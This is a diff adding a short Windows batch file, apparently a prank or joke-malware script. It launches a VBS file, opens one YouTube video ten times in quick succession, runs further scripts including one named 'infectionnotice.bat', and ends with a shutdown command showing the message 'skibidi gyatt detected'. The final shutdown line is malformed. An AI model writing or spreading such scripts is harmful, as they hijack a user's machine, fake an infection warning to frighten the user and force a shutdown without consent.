@@ -1,0 +1,30 @@
+@echo off
+start shittyvbs1.vbs
+timeout 10
+start www.youtube.com/watch?v=vExMh951NUQ&pp=ygUhc3BydW5raSBneWF0dCBzb25nIGJlbmppeHNjYXJsZXR0
+timeout 0.25
+start www.youtube.com/watch?v=vExMh951NUQ&pp=ygUhc3BydW5raSBneWF0dCBzb25nIGJlbmppeHNjYXJsZXR0
+timeout 0.25
+start www.youtube.com/watch?v=vExMh951NUQ&pp=ygUhc3BydW5raSBneWF0dCBzb25nIGJlbmppeHNjYXJsZXR0
+timeout 0.25
+start www.youtube.com/watch?v=vExMh951NUQ&pp=ygUhc3BydW5raSBneWF0dCBzb25nIGJlbmppeHNjYXJsZXR0
+timeout 0.25
+start www.youtube.com/watch?v=vExMh951NUQ&pp=ygUhc3BydW5raSBneWF0dCBzb25nIGJlbmppeHNjYXJsZXR0
+timeout 0.25
+start www.youtube.com/watch?v=vExMh951NUQ&pp=ygUhc3BydW5raSBneWF0dCBzb25nIGJlbmppeHNjYXJsZXR0
+timeout 0.25
+start www.youtube.com/watch?v=vExMh951NUQ&pp=ygUhc3BydW5raSBneWF0dCBzb25nIGJlbmppeHNjYXJsZXR0
+timeout 0.25
+start www.youtube.com/watch?v=vExMh951NUQ&pp=ygUhc3BydW5raSBneWF0dCBzb25nIGJlbmppeHNjYXJsZXR0
+timeout 0.25
+start www.youtube.com/watch?v=vExMh951NUQ&pp=ygUhc3BydW5raSBneWF0dCBzb25nIGJlbmppeHNjYXJsZXR0
+timeout 0.25
+start www.youtube.com/watch?v=vExMh951NUQ&pp=ygUhc3BydW5raSBneWF0dCBzb25nIGJlbmppeHNjYXJsZXR0
+timeout 3
+start infectionnotice.bat
+timeout 10
+start kyssongstarter.bat
+timeout 15
+start /min shitpost.bat
+timeout 5
+-shutdown l -t 60 -c "skibidi gyatt detected"
